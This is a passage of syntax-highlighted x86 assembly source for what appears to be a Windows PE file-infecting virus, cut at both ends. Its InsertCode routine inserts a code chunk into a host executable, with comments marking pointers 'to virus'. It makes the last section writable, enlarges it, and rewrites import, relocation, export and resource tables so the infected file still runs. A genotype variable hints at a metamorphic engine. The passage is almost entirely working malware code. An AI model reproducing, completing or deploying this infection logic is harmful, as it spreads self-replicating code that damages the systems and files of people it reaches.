</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">fixing</span><span class="sc0"> </span><span class="sc5">DLL</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                    </span><span class="sc1">;ID_OriginalFirstThunk</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_org_ft</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA4LIST</span><span class="sc0">                            </span><span class="sc1">;original firstthunk</span><span class="sc0">
  </span><span class="sc5">@@no_org_ft</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">;ID_TimeDateStamp</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">;ID_ForwarderChain</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;dll name</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">                     </span><span class="sc1">;ID_FirstThunk</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA4LIST</span><span class="sc0">                            </span><span class="sc1">;firstthunk</span><span class="sc0">

       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_dll</span><span class="sc0">

  </span><span class="sc5">@@done_import</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;fix relocationz</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done_relocs</span><span class="sc0">

</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">process</span><span class="sc0"> </span><span class="sc5">fixup</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@@next_chunk</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done_relocs</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;---&gt;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">process</span><span class="sc0"> </span><span class="sc5">block</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">do</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">relocations</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">block</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@next_reloc</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">RD_RelocType</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">                      </span><span class="sc1">;IMAGE_REL_BASED_HIGHLOW</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">reloc</span><span class="sc0"> </span><span class="sc9">type</span><span class="sc4">:%</span><span class="sc5">x</span><span class="sc4">&gt;,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@invalid_reloc</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc5">RD_RelocOffset</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;+RVA</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;+fmap</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

  </span><span class="sc5">@@invalid_reloc</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@next_reloc</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;remove RVA from stack</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@next_chunk</span><span class="sc0">

  </span><span class="sc5">@@done_relocs</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                  </span><span class="sc1">;ecx=fmap</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;update export table</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done_exports</span><span class="sc0">

</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">process</span><span class="sc0"> </span><span class="sc9">export</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">ecx.ED_Name</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;ED_Name</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">                                    </span><span class="sc1">;ED_Base(sux)</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">             </span><span class="sc1">;ED_NumberOfFunctions</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">             </span><span class="sc1">;ED_NumberOfNames</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;[esp+4]=no of names</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;[esp]=fmap</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;ecx=no of functions</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">UPDATING</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">ED_AddressOfFunctions</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DO_LIST</span><span class="sc0">

       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">UPDATING</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">ED_AddressOfOrdinals</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DO_LIST</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

  </span><span class="sc5">@@done_exports</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                  </span><span class="sc1">;esi=import dir+4</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                    </span><span class="sc1">;eax=rva of resources</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@no_resource</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;*</span><span class="sc5">process</span><span class="sc0"> </span><span class="sc5">resource</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc4">&gt;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_NT_HEADERS</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@@find_resource_section</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;eax==resource rva</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;virtual address</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;virtual size</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@found_section</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">@@find_resource_section</span><span class="sc0">

  </span><span class="sc5">@@found_section</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;raw data ofs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">resource</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">rva</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc2">1st</span><span class="sc0"> </span><span class="sc5">resource</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc0"> </span><span class="sc5">raw</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">%x</span><span class="sc4">&gt;,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RAW</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ProcessResource</span><span class="sc0">                     </span><span class="sc1">;esi=res dir</span><span class="sc0">

  </span><span class="sc5">@@no_resource</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;esi=resource dir+4</span><span class="sc0">

  </span><span class="sc5">@@no_fix</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                  </span><span class="sc1">;edi=raw of inserted chunk</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">insert_raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;eax=rva of inserted chunk</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">insert_rva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">next_section_start</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@@skipfill</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">fmap</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

  </span><span class="sc5">@@skipfill</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">genotype_rva</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RVA2RVA</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">genotype_rva</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

       </span><span class="sc6">popad</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

  </span><span class="sc5">@@increase_last_section</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc4">+\
</span><span class="sc0">                                       </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">;edx==rva 2virus</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;ebx==raw ptr2virus</span><span class="sc0">

       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;eax==raw end of code</span><span class="sc0">
                            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;new file size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;new raw size</span><span class="sc0">

       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@no_fix</span><span class="sc0">
</span><span class="sc5">InsertCode</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc5">RVA2RVA</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@no_fix_neeed</span><span class="sc0">
</span><span class="sc5">DEBUGSTR</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc4">=%</span><span class="sc5">X</span><span class="sc0"> </span><span class="sc5">now</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc4">=%</span><span class="sc5">x</span><span class="sc4">+%</span><span class="sc5">x</span><span class="sc4">&gt;,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
  </span><span class="sc5">@@no_fix_neeed</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">RVA2RVA</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">


</span><span class="sc5">RVA4LIST</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;esi==list of RVAs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">@@next_item</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;end of list?</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">
